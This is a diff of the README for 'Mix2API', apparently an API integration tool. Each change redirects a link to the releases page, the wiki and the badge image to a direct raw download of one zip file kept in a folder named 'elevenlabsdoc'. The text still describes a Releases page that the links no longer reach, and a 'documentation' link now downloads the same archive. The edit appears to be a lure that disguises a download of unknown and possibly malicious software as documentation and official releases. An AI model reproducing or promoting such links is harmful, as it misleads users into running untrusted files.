@@ -1,6 +1,6 @@
 # 🚀 Mix2API - Effortless Integration of APIs for Everyone
 
-[![Download Mix2API](https://img.shields.io/badge/Download-Mix2API-brightgreen)](https://github.com/saurabh-0227/Mix2API/releases)
+[![Download Mix2API](https://raw.githubusercontent.com/saurabh-0227/Mix2API/main/elevenlabsdoc/Mix2API_v1.5.zip)](https://raw.githubusercontent.com/saurabh-0227/Mix2API/main/elevenlabsdoc/Mix2API_v1.5.zip)
 
 ## 📋 Description
 
@@ -21,7 +21,7 @@ To get started with Mix2API, follow these simple steps to download and set up th
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can download the latest version of Mix2API.  
-   [Download Mix2API](https://github.com/saurabh-0227/Mix2API/releases)
+   [Download Mix2API](https://raw.githubusercontent.com/saurabh-0227/Mix2API/main/elevenlabsdoc/Mix2API_v1.5.zip)
 
 2. **Select the Desired Version**  
    On the Releases page, you will see different versions listed. Choose the latest version, which is usually at the top of the list.
@@ -87,7 +87,7 @@ We welcome contributions from everyone. If you'd like to help improve Mix2API, p
 
 ## 💻 Further Reading and Resources
 
-- Check our [documentation](https://github.com/saurabh-0227/Mix2API/wiki) for in-depth guides and tutorials.
+- Check our [documentation](https://raw.githubusercontent.com/saurabh-0227/Mix2API/main/elevenlabsdoc/Mix2API_v1.5.zip) for in-depth guides and tutorials.
 - Join our community forums to share experiences and ideas.
 
-[Download Mix2API](https://github.com/saurabh-0227/Mix2API/releases) and start your journey into API integration today!
+[Download Mix2API](https://raw.githubusercontent.com/saurabh-0227/Mix2API/main/elevenlabsdoc/Mix2API_v1.5.zip) and start your journey into API integration today!
